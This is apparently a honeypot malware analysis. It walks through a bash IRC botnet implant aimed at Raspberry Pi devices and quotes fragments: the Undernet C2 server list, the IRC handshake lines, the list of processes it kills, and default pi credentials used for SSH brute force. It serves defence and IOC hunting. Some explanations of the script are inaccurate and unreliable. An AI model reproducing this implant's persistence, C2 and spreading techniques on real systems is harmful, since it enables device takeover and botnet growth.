# 534f62e75abcbb088a215f58a4a90edd734e77cdbea3029c53ffa1306708f61c
## Overview 
- Script is written in bash to connect back to a botnet C2 server via the IRC protocol
- This script is the most advanced bash script captured by the cowrie Dshield honeypot at the time of of writing 8/1/22.
- This highlights threat actors move away from commonly known protocols (HTTP/HTTPS/DNS) to more niche edge case protocols that an enterprise might not be monitoring (or even be aware of).
- Many organizations rely on solutions such as  `squid proxy` to provide insight into HTTPS traffic leaving their enterprise, without packet capture running via `tcpdump` on public facing Unix devices, this C2 traffic could easily be missed.

## Lines 4-6 
- Setting of custom enviromental variables 
````
MYSELF=`realpath $0`
DEBUG=/dev/null
echo $MYSELF >> $DEBUG
````
- `realpath $0` simply will print the directory (without the script name) that it is running from.
- i.e. if the path is `/home/user/Desktop/mal.sh` entering `realpath $0` would return `/home/user/Desktop`
- Line 5 is pretty self explanitory 
- Line 6 the script will then set the `DEBUG` variable to the value of the `realpath $0` which is where the script is running from
## Line 8 
- The script then checks if it is running as root
- If it is:
- Line 10 sets new variable caled `NEWMYSELF` and sets the value equal to `mktemp -u 'XXXXXXXX'`
- `mktemp -u 'XXXXXXXX'` does not make a new directory it will print a random string of upper + lower case letters with the amount of `XXX` denoting the char count
- Thus `NEWMYSELF` will be set to a random string each time the script is run making it difficult to utilize this as an IOC
- The script (line 11) will then copy itself into `/opt/result-of-mktemp-cmd`.  As the `opt` part is hard coded this can form as a fantastic IOC.
- The next three lines are the scripts persistance mechanism.  It will add itself to `rc.local` allowing it to survive a reboot, and execute everytime on start up 
- It will then reboot the device (line 16)
- If its not running as root:
- It will set the variable `TMP1` to the value of `mktemp` 
- It will then echo the value of `mktemp` into `$DEBUG` overwriting the value of `dev/shm` which it was previously set to 
- It will then stop all instances of 
````
bins.sh, minerd, node, nodejs, ktx-armv4l, ktx-i586, ktx-m68k, ktx-mips, ktx-mipsel, ktx-powerpc, ktx-sh4, ktx-sparc, arm5, zmap, kaiten, perl
````
- It will then add `"127.0.0.1 bins.deutschland-zahlung.eu"` to the `/etc/hosts` file preventing the device from being able to access any of its internal services.
- This can also act as a fantastic IOC as this URL is hardcoded into the script.
- It will then delete (lines 38, 39) the `.bashrc` for the `root` and `pi` user.  This script appears to be specifically targeting raspberry pi devices
- In addition it will change the password to the `pi` user and set it to `$6$vGkGPKUr$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1`
- It will add the `/root/.ssh` directory if it already does not exist and append a public key to the `authorized_keys` file adding another layer of persistance.
- Finally it will add `8.8.8.8` to the `etc/resolve.conf` simply adding `Google DNS` to the devices DNS server pool
### Deleting Things 
- Line (47) it will delete all tmp files associated with the `ktx*` processes that we say it attempting to stop earlier in the script
- It also deletes all tmp files associated with the `cpuminer` and `kaiten` process that we also say it attempting to kill if they were running

### Here doc
- It will echo a public key into `tmp/public.pem` (another great IOC) utilizing a `Here Doc` method which is annotated by its use of `<<EOFMARKER`
- It can be assumed that this public key can be used to reach out to `127.0.0.1 bins.deutschland-zahlung.eu` as from OSINT you cannot access that domain without the proper key
## Make the name for the bot 
- It will then use another `mktemp` command to generate a random name for the bot that it will then chack back in ith 
### Exfil survey data
- It not focuses on its initial survey to report back to the c2, and it does so in a curious way.
- It will get the first parameter for the `uname -a` command which will almost always be `Linux` it will then `md5sum` that returned value.
- It then sets the variable `NICK` equal to `a${SYS:24}` which prints `a`, so `NICK=a`
- It will begin its `while true` loop with 6 listed C2 domains
````
  arr[0]="ix1.undernet.org"
	arr[1]="ix2.undernet.org"
	arr[2]="Ashburn.Va.Us.UnderNet.org"
	arr[3]="Bucharest.RO.EU.Undernet.Org"
	arr[4]="Budapest.HU.EU.UnderNet.org"
	arr[5]="Chicago.IL.US.Undernet.org"
````
- It will pick one to connect back to at random denoted by line 76 `rand=$[RANDOM % 6]
- it will then set the server address for the C2 to one of those names via line 77 `svr=${arr[$rand]}` --> it will utilize this `svr` variable shortly
- It will then connect back on port `6667` to its chosen domain as seen in the `eval` statement (line 79)
## if statement check 
- After executing that `eval` (connect to c2) command it will then check the exit status and if it is equal to "0" (successful)
- If the command is sucsessful it will continue if it is not it will `echo $NICK` which was previously set to `a`.
- It will then execute `eval 'printf "NICK $NICK\r\n" >&3;'` which normally would return `Bad file descriptor error` 
- However due to the `eval` command on line 79 it will open a remote connection to the C2 server.  The connection will be visible in the `netstat` output, however it will not open a reverse shell it will simply connect to the C2.  
- At this time the C2 would not have a shell on its port `6667` it is simply testing its connection ability by sending `NICK a` back to the C2
- If that connect back where it prints `NICK a` is successful it will continue onward with the script, if it is not successful it will attempt to execute:
````
eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
````
- This command due to the initial connect back see again on line 79 will post back to the C2 server `USER user 8 * :IRC hi`
- This would confirm with the c2 server that a victim is on the hook and due to the message being `hi` it wouldnt particularly look malicious.
## Main Loop
- This main loop starts on line 95 and is the heart of this program, it utilizes another `while true` loop making this run until the script is killed or the box is rebooted (it will restart to the `rc.local` persistance set up earlier)
- It will constantly be attempting to `"read msg_in` (from the C2 server) (line 97)
- If it does successfully read the message in (checked by if statement line 99) it will break out of the if statement and jump to the next one
- In other words it will lay dormient and continue to try and `read msg_in` when it does it will jump down to line 103
- On line 103 it will attempt to evaluate if the message in is equal to `"PING"`
- If it is, the implant side of the equation will then respond with `PONG` and then on a new line send back `JOIN #biret`
- Above covers one half of the `if statement` starting on line `99`
- The real capability of this script is starting on line `114`
- The script is constantly attempting to read a message in like we discussed previously
- If it reads in `PRIVMSG` this is truly where the backdoor comes into play 
- Our user sets three variables right off the bat:
````
privmsg_h=$(echo $msg_in| cut -d':' -f 3)
privmsg_data=$(echo $msg_in| cut -d':' -f 4)
privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)
````
- The first variable `privmsg_h` cuts the input on the `:` character and prints out just the third field
- The second variable does the exact same thing but prints out the fourth field
- Finally the third variable `privmsg_nick` echos the message in cuts on the `:` and prints the second field.  This is in addition to cutting on the `!` character and printing the first field 
- It will then echo the value of `privmsg_data` (which was the fourth field in the message in) decode it from base64 (-i to ignore non valid characters), get the `md5sum` of that now decoded string and print the first field 
- Directly after on line 120 it will echo the value of `privmsg_h` (which was the third field of the message in) decode it from base64 (again -i) and verify that it was signed with the corresponding private key (remember the public key is saved in this script)
- It compares the `sign` and `hash` valribles to ensure that they match
- From there on line 123, provided the hash values are equal it will decode the actual linux command sent from the C2 serverand store it in the `CMD` variable.
- Lines 124 and 125 will then execute the command and ship the output back to the IRC C2 server.
- Provided the `sign` variable and the `hash` variable are not equal it will simply break from the `if` statement.
- 




### Take over the Internet 
- Starting on line 135 this is where the script attempts to log its output and errors.  It starts by making the `$BOT` varible executable 
- Remember back when it used this variable to set the name of the script to a random string 
````
BOT=`mktemp -u 'XXXXXXXX'`
````
- Interestingly enough it then uses `nohup` to redirect `stdout` and `stderr` to a file in `/tmp` called `bot.log`
- This log file was crucial to our reversing the `PRIVMSG` portion of the C2, while this is great for the bot master to troubleshoot failing bots it was also great for our team of reverse engineers to figure out all the intricacies of the C2 functionality.  Thanks bot master.

- It will then on line 144 create a new hidden file called `.s` also located in the `/tmp` directory
- It immediately deletes the `nohup.log` located in `/tmp` and also the `nohup.out` file which is created in the directory that the script is executing out of
### Take over the Internet 
- Starting on line 146 this is where the script attempts to spread itself from victim to victim.
- It starts by installing two packages called `zmap` (used for scanning the entire internet on a specific port) in addition to `sshpass` which is a utility to allow ssh authentication from script.  Normal ssh authentication cant really be acomplshed in  script enviroment due to the password prompt and it requiring a tty
- It enters a `while true` loop on line 149 that creates an empty temp file and then will scan a random 100000 ip address for port 22 and output them into the `$TEMP` file.
- It will then `killall ssh scp` as denoted on line 152 which will execute in the context of the local victim machine (very annoying)
- From there it attempts to read from the file of 100000 ip addresses and brute force each one with the credentials of 
````
pi:raspberry
pi:raspberryraspberry993311
````
- It will attempt to copy the malicious script into the new victims `/tmp 
### Wrapping Up
- This final image is taken from my honeypots web interface (you might recognize it as part of the SANs Internet Storm Center DShield program).  This graphic was included to simply highlight how much an average public facing device is getting touched from random devices through out a normal day.  Its quite astounding, and illistruates the need for strong passwords (or key authentication only).  I hope you have taken something away from this article today.  If the interest is there I am happy to do a second part on recreateing their C2 set up via IRC and showing how this implant could be abused and spoof data back to the C2 side.  Happy Hacking.
- ![image](https://user-images.githubusercontent.com/75596877/182392326-3ff5c037-bff5-410f-9dcf-c739ba9d9a43.png)
